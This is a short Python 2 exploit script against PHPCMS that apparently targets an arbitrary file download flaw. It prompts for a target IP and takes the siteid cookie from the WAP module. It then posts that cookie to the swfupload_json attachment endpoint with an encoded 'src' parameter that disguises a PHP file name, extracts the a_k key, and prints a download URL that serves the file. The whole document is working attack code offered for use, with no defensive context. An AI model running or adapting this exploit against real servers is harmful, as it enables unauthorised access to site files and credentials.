#!/usr/bin/env python
#-*- coding:utf-8 -*-
import urllib
import urllib2
import re
import cookielib

def checkip(ip):
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')  
    if p.match(ip):  
        return True  
    else:  
        return False 

def cookies(url):
    cookie = cookielib.CookieJar()
    handler=urllib2.HTTPCookieProcessor(cookie)
    opener = urllib2.build_opener(handler)
    response = opener.open(url)
    return cookie


ip = raw_input("please input the phpcms ip:")
if (checkip(ip)):
    url_1 = "http://" + ip + "/phpcms/index.php?m=wap&c=index&a=init&siteid=1"
    print u"请稍等...正在获取KEtUI_siteid:"
    cookie_1 = cookies(url_1)
    for i in cookie_1:
        if "siteid" in i.name:
            userid_flash = i.value
            print "userid_flash = " + userid_flash
            break
    else:
        print u"userid_flash 获取失败"
    url_2 = "http://" + ip + "/phpcms/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp"
    print u"请稍等...正在获取a_k"
    postdata = dict(userid_flash=userid_flash)
    postdata = urllib.urlencode(postdata)
    request = urllib2.Request(url_2,postdata)
    cookie_2 = cookies(request)
    for j in cookie_2:
        if "att_json" in j.name:
            a_k = j.value
            print a_k
            print "a_k = " + a_k
            break
    else:
        print u"a_k获取失败"
    url_3 = "http://" + ip + "/phpcms/index.php?m=content&c=down&a=init&a_k=" + a_k
    print url_3
else:
    print "Try again!"
